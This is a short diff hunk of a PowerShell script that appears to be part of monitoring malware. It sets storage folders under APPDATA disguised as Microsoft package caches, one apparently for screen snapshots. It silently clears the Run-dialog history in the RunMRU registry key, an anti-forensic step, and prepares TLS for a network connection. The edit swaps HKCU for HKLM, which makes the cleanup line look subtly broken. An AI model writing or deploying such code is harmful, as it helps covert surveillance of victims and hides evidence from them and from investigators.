@@ -10,7 +10,7 @@ $global:MonPath = "$env:APPDATA\Packages\Microsoft.WindowsSystem\Cache"
 $global:MonPathJson = "$env:APPDATA\Packages\Microsoft.WindowsTerm\Cache"
 $global:MonPathSnap = "$env:APPDATA\Packages\Microsoft.WindowsSys\Cache\Winsnap"
 
-Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name * -ErrorAction SilentlyContinue
+Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name * -ErrorAction SilentlyContinue
 
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor `
